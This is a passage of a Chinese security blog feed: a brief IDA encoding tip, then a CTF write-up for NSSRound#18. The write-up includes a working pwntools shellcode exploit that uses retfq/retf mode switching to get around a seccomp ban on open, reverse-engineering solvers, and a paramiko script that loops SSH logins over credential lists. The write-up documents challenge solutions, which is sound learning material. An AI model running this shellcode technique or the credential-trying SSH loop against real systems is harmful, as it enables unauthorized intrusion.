    <content type="html"><![CDATA[<p>之前ida一直不知道如何识别中文字符<img src="/2024/03/04/IDA%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E5%AD%97%E7%AC%A6/image-20240304210011904.png" class="" title="image-20240304210011904"></p><p>在目录后面加参数-dCULTURE&#x3D;all和把编码方式改为gbk都失败了</p><p>后来用学长的ida发现能正常显示中文，查看编码方式原来是gb2312</p><p>于是我在ida8.3里右键插入新的编码方式</p><img src="/2024/03/04/IDA%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E5%AD%97%E7%AC%A6/image-20240304210343584.png" class="" title="image-20240304210343584"><p>然后在ida左下角右键重新分析</p><img src="/2024/03/04/IDA%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E5%AD%97%E7%AC%A6/image-20240304210511607.png" class="" title="image-20240304210511607"><p>再右键rebuild即可</p><img src="/2024/03/04/IDA%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E5%AD%97%E7%AC%A6/image-20240304210546604.png" class="" title="image-20240304210546604">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>NSSRound#18部分wp</title>
    <link href="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/"/>
    <url>/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/</url>
    
    <content type="html"><![CDATA[<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="HappyCTF"><a href="#HappyCTF" class="headerlink" title="HappyCTF"></a>HappyCTF</h2><p>参考链接：<a href="https://xz.aliyun.com/t/6645?time__1311=n4+xnD0DRDBGitN47KDsA3xCqbu75eD9AQ=oD&alichlgref=https://www.baidu.com/link?url=A-_IFOUlIylJIvrt12kXZxAyQ2f2S3p-psE9bObB9i-3sfMgYghL6qEvFbu98k-Q&wd=&eqid=f2850db1072b3e270000000265cc33af">https://xz.aliyun.com/t/6645?time__1311=n4%2BxnD0DRDBGitN47KDsA3xCqbu75eD9AQ%3DoD&amp;alichlgref=https%3A%2F%2Fwww.baidu.com%2Flink%3Furl%3DA-_IFOUlIylJIvrt12kXZxAyQ2f2S3p-psE9bObB9i-3sfMgYghL6qEvFbu98k-Q%26wd%3D%26eqid%3Df2850db1072b3e270000000265cc33af</a></p><p>看到rwx基本上是shellcode</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1707882413729-a8b684db-8573-447e-a278-5447c939771a-170808409444444.png" class="" title="img"><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1707882320571-ffb866fd-3a4b-4970-9dd8-2565512afce9-170808409444446.png" class="" title="img"><p>vuln函数反编译不了，问题不大</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1707879608622-3f721439-e2cf-4a39-a7a5-7452e147cf52-170808409444448.png" class="" title="img"><p>敲，后面发现把open给禁了，那得用retfq和retf了</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1708081299573-447e5ca9-254f-4562-87cd-130c5e595733.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment">#p = remote(&quot;node1.anna.nssctf.cn&quot;,28592)</span><br>p = process(<span class="hljs-string">&quot;./HappyCTF&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./HappyCTF&quot;</span>)<br><br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><span class="hljs-comment">#context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : p.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : p.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : p.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : p.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> p.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(p.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rl</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> p.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : p.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br><span class="hljs-keyword">return</span> u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><br><span class="hljs-comment">#gdb.attach(p,&#x27;b *0x4013a0&#x27;)</span><br>sh = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">push 0x40404040 /*set rdi*/</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x7e /*set rsi*/</span><br><span class="hljs-string">pop rsi</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 9 /*set rdx*/</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 7</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string">push 34</span><br><span class="hljs-string">pop r10</span><br><span class="hljs-string">xor r9,r9</span><br><span class="hljs-string">xor r8,r8</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">/read/</span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">xor rdi,rdi</span><br><span class="hljs-string">push 0x40404040</span><br><span class="hljs-string">pop rsi</span><br><span class="hljs-string">push 200</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x23</span><br><span class="hljs-string">push rsi</span><br><span class="hljs-string">retfq</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>,arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br>sd = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov esp,0x40404040</span><br><span class="hljs-string">mov eax,5</span><br><span class="hljs-string">push 0x00006761</span><br><span class="hljs-string">push 0x6c662f2e</span><br><span class="hljs-string">mov ebx,esp</span><br><span class="hljs-string">xor ecx,ecx</span><br><span class="hljs-string">int 0x80</span><br><span class="hljs-string">push 0x33</span><br><span class="hljs-string">push 0x40404062</span><br><span class="hljs-string">retf</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>,arch = <span class="hljs-string">&#x27;i386&#x27;</span>)<br>sf = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov rax,0</span><br><span class="hljs-string">mov rdi,3</span><br><span class="hljs-string">mov rsi,0x40404128</span><br><span class="hljs-string">mov rdx,0x30</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov rax,1</span><br><span class="hljs-string">mov rdi,1</span><br><span class="hljs-string">mov rsi,0x40404128</span><br><span class="hljs-string">mov rdx,0x30</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br>sa(<span class="hljs-string">&quot;:&quot;</span>,sh)<br>pause()<br>sl(sd+sf)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>直接密文去解密不对</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1707896480014-6513872d-2a7a-4f57-a6b7-27fe2aa5a271.png" class="" title="img"><p>有tls也绕过了（tls不一定能够用上）</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1707896510027-81ff0497-65d7-4ea5-9c79-fd25036fd396.png" class="" title="img"><p>也没看出有其他的算法</p><p>这种一般都是自己设计的算法，要静下心来看</p><p>发现先十进制转二进制</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1708050502254-af67ad5d-02e9-4c98-9e25-8a52fa81bd84.png" class="" title="img"><p>经过rc4初始化算法</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1708050549029-968a083a-1240-484f-b9f2-b86796fdb424.png" class="" title="img"><p>再把二进制转化为十进制作为下标去找对应的值，类似于base64</p><p>这种要通过爆破，首先找密文在table里的下标</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python">table = [<br>    <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0xC9</span>,<br>    <span class="hljs-number">0xCA</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0xD3</span>,<br>    <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0xE3</span>,<br>    <span class="hljs-number">0xE4</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0xED</span>,<br>    <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0xF7</span>,<br>    <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0xB6</span>,<br>    <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xAE</span><br>]<br><br>enc = <span class="hljs-built_in">bytearray</span>.fromhex(<span class="hljs-string">&quot;E2F7D3E2C8B4D8C5CFB4E7EEE1D9F1EFCBEBD9C9CEC5D9E5CCB7D1EDE0B4F1EEE0E7D2F6CBF3C9F3D3D5EF&quot;</span>)<br><span class="hljs-built_in">print</span>(enc)<br>idx = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> enc:<br>    idx.append(table.index(i))<span class="hljs-comment">#遍历字节数组enc中的每个元素，使用table.index(i)方法找到该元素在table列表中的索引</span><br><br>s = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> idx:<br>    s.append(<span class="hljs-built_in">bin</span>(i)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">6</span>))<span class="hljs-comment">#zfill左侧填充</span><br><br>res = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0b111111</span>):<br>        c = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">bin</span>(j)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">6</span>))<br>        l = <span class="hljs-number">0</span><br>        r = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">256</span>,<span class="hljs-number">2</span>):<span class="hljs-comment">#i=v3+1=i+1+1</span><br>            l = (k + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>            r = (l + r + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>            c[l % <span class="hljs-number">6</span>], c[r % <span class="hljs-number">6</span>] = c[r % <span class="hljs-number">6</span>], c[l % <span class="hljs-number">6</span>]<br>        d = <span class="hljs-string">&quot;&quot;</span>.join(c)<br>        <span class="hljs-keyword">if</span> d == i:<br>            res += <span class="hljs-built_in">bin</span>(j)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">6</span>)<br>            <span class="hljs-keyword">break</span><br><br>b = [res[i:i+<span class="hljs-number">8</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(res), <span class="hljs-number">8</span>)]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> b:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(i, <span class="hljs-number">2</span>)), end=<span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-comment">#NSSCTF&#123;Y0u_4reThe_K1ng_0fBase64&#125;</span><br></code></pre></td></tr></table></figure><h2 id="GenshinWishSimulator"><a href="#GenshinWishSimulator" class="headerlink" title="GenshinWishSimulator"></a>GenshinWishSimulator</h2><p>unity逆向</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1707900162098-9fff77af-2806-41ac-866c-8991156082c7.png" class="" title="img"><p>用dnspy打开，找关键类*Manager</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1707901366902-a403543b-7c1e-47b6-ad11-9776325c9cd8.png" class="" title="img"><p>用z3解方程组</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1707902129974-d2e72bff-cce6-4c4d-affd-f32e5f84bf3f.png" class="" title="img"><p>得到iv</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1707902261420-02f82295-67c4-477e-8674-c6ad06b5b9f1.png" class="" title="img"><p>145,118,31,48,103,110,52,82,113,19,83,44,176,130,138,129,115,110,38,10,42,100,193,105,125,61,7,229,230,180,68,133,11,177,210,122,161,60,129,140,16,45,224,83,238,0,213,157,121,193,135,197,87,118,155,110,90,91,30,158,248,44,95,215,166,247,239,43,228,114,227,146,164,137,111,79,143,17,132,14</p><p>key和填充方式很明显，但是解不出来？</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1707905579072-8d1e25a1-ec40-4bb9-9c35-60d95850cc67.png" class="" title="img"><p>md，key和iv弄反了，而且key是utf-8形式，不找借口</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1708008328700-57e3f9c3-60ba-4b81-b999-6e1791f9855f.png" class="" title="img"><p>用另一种方式复现</p><p>要经过check函数才会执行gift</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1708008674108-1e115c0f-0266-4197-9f3b-d3bbd9ae9567.png" class="" title="img"><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1708008835792-7cb82437-2578-47d6-a225-1df4bbec6959.png" class="" title="img"><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1708008882947-d72a0c6a-4e9f-4efb-9dc0-83df6e4af26b.png" class="" title="img"><p>修改初始值的话选择编辑类</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1708008910188-821abe3f-4db0-440d-9c19-04fc8c88a72a.png" class="" title="img"><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1708009108153-0bd6ce8f-8d07-4512-bf4c-d518cbb331f3.png" class="" title="img"><p>如果直接保存模块也能出，还是有一定概率</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1708009225510-6cfe7d63-9df6-4784-a4ef-2e73f8f09c5f.png" class="" title="img"><p>要的flag在这里，修改一下使得它必然被执行</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1708009396841-b920b4d0-fa87-45f9-9058-ee4b5bf7bc4d.png" class="" title="img"><p>右键编辑方法</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1708009508484-d19253c5-2bba-428e-b6ea-107e6f5171ee.png" class="" title="img"><h2 id="新年快乐"><a href="#新年快乐" class="headerlink" title="新年快乐"></a>新年快乐</h2><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1708053405853-dab66655-2aa2-48ae-86cf-56d3488772a7.png" class="" title="img"><p>string有dll</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1708053940754-b3a3b96a-3c0b-458e-a3c4-d72451611a5c.png" class="" title="img"><p>也没看到有sha256算法</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1708054072607-ad2c4d64-f471-4eb1-b285-19581f54694d.png" class="" title="img"><p>010搜索MZ</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1708054194721-3290df63-dc66-4aa8-941d-49c46082fa3e.png" class="" title="img"><p>用Dnspy打开</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1708063124709-72492c56-0475-4245-8080-1c845e3e67ad.png" class="" title="img"><p>用vscode运行即可</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1708065409901-24731386-9db8-4c83-a1b8-df148d58cc6e.png" class="" title="img"><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="酒吧"><a href="#酒吧" class="headerlink" title="酒吧"></a>酒吧</h2><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1707897006283-e11c8e66-60d8-453b-bbb4-4923172ebad4.png" class="" title="img"><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1707897289557-b1b0d72c-33b7-452d-b9d9-3c335f494b72.png" class="" title="img"><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1707897442652-5643f483-589a-42c4-a7ee-ac578ca09b93.png" class="" title="img"><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1707897125919-70ff2871-f8fc-49d1-af17-80f663910385.png" class="" title="img"><h2 id="number7"><a href="#number7" class="headerlink" title="number7"></a>number7</h2><p>直接解base64会出错，修改第七个和第九个数字从0到f都不对</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1707898430820-55d77299-2129-495c-8f4b-9674a7e705b3.png" class="" title="img"><p>根据Number7 而且inside NO.7猜测cisco type7加密</p><p>后面少了几位，但是不影响flag<img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1708007743062-01c8b0da-a225-42ab-8bf6-0c5ee8524710.png" class="" title="img"></p><h2 id="userssss"><a href="#userssss" class="headerlink" title="userssss"></a>userssss</h2><p>想法是写脚本算md5sum，然后自动交互</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1707899075674-94d6549e-74b1-4fa9-9a6d-11d6ac0001c0.png" class="" title="img"><p>不知道要向远程怎么发送，要有用户名和密码</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1707899762242-e173afcc-df88-420a-a26c-f2ae5bb6c5c8.png" class="" title="img"><p>首先md5sum就是MD5，其次用ssh -p连接</p><img src="/2024/02/16/NSSRound-18%E9%83%A8%E5%88%86wp/1708009841111-baa8ea56-12cd-4ef5-bb68-60ab768691fb.png" class="" title="img"><p>自动算md5</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/bin/bash</span><br><br><span class="hljs-built_in">input</span>=<span class="hljs-string">&quot;/CVE/wordlist.txt&quot;</span><br>output=<span class="hljs-string">&quot;/CVE/4.txt&quot;</span><br><br><span class="hljs-comment"># 重置输出文件</span><br>&gt; <span class="hljs-string">&quot;$output&quot;</span><br><br><span class="hljs-comment"># 遍历wordlist.txt中的每一行</span><br><span class="hljs-keyword">while</span> IFS= read -r line || [[ -n <span class="hljs-string">&quot;$line&quot;</span> ]]; do<br>    <span class="hljs-comment"># 跳过空白行</span><br>    <span class="hljs-keyword">if</span> [[ -z <span class="hljs-string">&quot;$line&quot;</span> ]]; then<br>        <span class="hljs-keyword">continue</span><br>    fi<br><br>    <span class="hljs-comment"># 计算每行的MD5哈希值</span><br>    md5=$(echo -n <span class="hljs-string">&quot;$line&quot;</span> | md5sum | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span>)<br>    <br>    <span class="hljs-comment"># 将计算出的哈希值追加到4.txt文件中</span><br>    echo <span class="hljs-string">&quot;$md5&quot;</span> &gt;&gt; <span class="hljs-string">&quot;$output&quot;</span><br>done &lt; <span class="hljs-string">&quot;$input&quot;</span><br></code></pre></td></tr></table></figure><p>自动交互</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> paramiko<br><br><span class="hljs-comment"># 设置主机信息</span><br>hostname = <span class="hljs-string">&#x27;node1.anna.nssctf.cn&#x27;</span><br>port = <span class="hljs-number">28591</span><br><br><span class="hljs-comment"># 读取用户名和密码列表</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;wordlist.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> user_file:<br>    usernames = user_file.read().splitlines()<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;10.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> pass_file:<br>    passwords = pass_file.read().splitlines()<br><br><span class="hljs-comment"># 确保用户名和密码列表长度相同</span><br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(usernames) == <span class="hljs-built_in">len</span>(passwords), <span class="hljs-string">&quot;用户名和密码数量不匹配&quot;</span><br><br><span class="hljs-comment"># 尝试登录并执行命令</span><br><span class="hljs-keyword">for</span> username, password <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(usernames, passwords):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 初始化SSH客户端</span><br>        client = paramiko.SSHClient()<br>        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())<br>        <br>        <span class="hljs-comment"># 尝试连接</span><br>        client.connect(hostname, port, username, password, timeout=<span class="hljs-number">10</span>)<br>        <br>        <span class="hljs-comment"># 执行ls命令</span><br>        stdin, stdout, stderr = client.exec_command(<span class="hljs-string">&#x27;ls&#x27;</span>)<br>        output = stdout.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        <br>        <span class="hljs-comment"># 检查是否存在flag.txt</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag.txt&#x27;</span> <span class="hljs-keyword">in</span> output:<br>            <span class="hljs-comment"># 读取flag.txt内容</span><br>            stdin, stdout, stderr = client.exec_command(<span class="hljs-string">&#x27;cat flag.txt&#x27;</span>)<br>            flag_content = stdout.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>).strip()<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;找到flag: <span class="hljs-subst">&#123;flag_content&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;在用户 <span class="hljs-subst">&#123;username&#125;</span> 的目录中没有找到flag.txt&quot;</span>)<br>        <br>    <span class="hljs-keyword">except</span> paramiko.AuthenticationException:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;登录失败：用户名 <span class="hljs-subst">&#123;username&#125;</span> 或密码错误&quot;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;发生错误：<span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">finally</span>:<br>        client.close()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>pwn调试插件的安装与使用</title>
    <link href="/2024/02/12/pwn%E8%B0%83%E8%AF%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
